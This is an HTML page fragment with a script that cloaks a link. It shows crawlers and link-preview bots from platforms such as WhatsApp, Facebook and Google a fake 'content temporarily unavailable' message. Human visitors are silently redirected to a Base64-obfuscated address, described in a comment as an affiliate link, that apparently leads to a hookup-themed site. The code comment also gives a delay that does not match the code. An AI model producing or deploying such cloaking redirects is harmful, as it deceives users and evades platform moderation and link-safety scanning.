<body>
  <div id="conteudo" class="loading">
    <div class="spinner"></div>

  </div>

  <script>
  (function () {
    const userAgent = navigator.userAgent.toLowerCase();

    const botKeywords = [
      'bot', 'crawl', 'spider', 'facebook', 'twitter', 'slack',
      'discord', 'linkedin', 'preview', 'whatsapp', 'telegram',
      'pinterest', 'reddit', 'nuzzel', 'skype', 'google', 'bitlybot'
    ];

    // Verifica se é bot
    for (let i = 0; i < botKeywords.length; i++) {
      if (userAgent.includes(botKeywords[i])) {
        document.body.innerHTML = "<h1>Conteúdo temporariamente indisponível.</h1>";
        return;
      }
    }

    // Link de afiliado codificado em Base64
    const encodedLink = "aHR0cDovL3F1aWNraG9va3VwLmNsdWI=";
    const destination = atob(encodedLink);

    // Redireciona após 1.5 segundos
    setTimeout(() => {
      window.location.href = destination;
    }, 900);
  })();
</script>
